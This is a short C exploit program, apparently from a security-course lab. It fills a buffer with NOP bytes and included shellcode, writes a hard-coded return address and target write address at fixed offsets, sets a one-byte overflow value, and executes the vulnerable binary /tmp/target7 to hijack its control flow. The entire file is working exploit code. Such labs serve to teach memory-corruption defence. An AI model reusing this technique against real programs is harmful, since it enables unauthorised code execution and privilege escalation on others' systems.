#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target7"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  
  args[1] = malloc(202);
  memset(args[1], 0x90, 200);
  args[1][201] = '\0';
  memcpy(args[1], shellcode, strlen(shellcode));

  *(unsigned int *)(args[1] + 192) = 0xbffffcd0; // Value to write
  *(unsigned int *)(args[1] + 196) = 0x08049718; // Address to write to

  args[1][200] = 152;

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
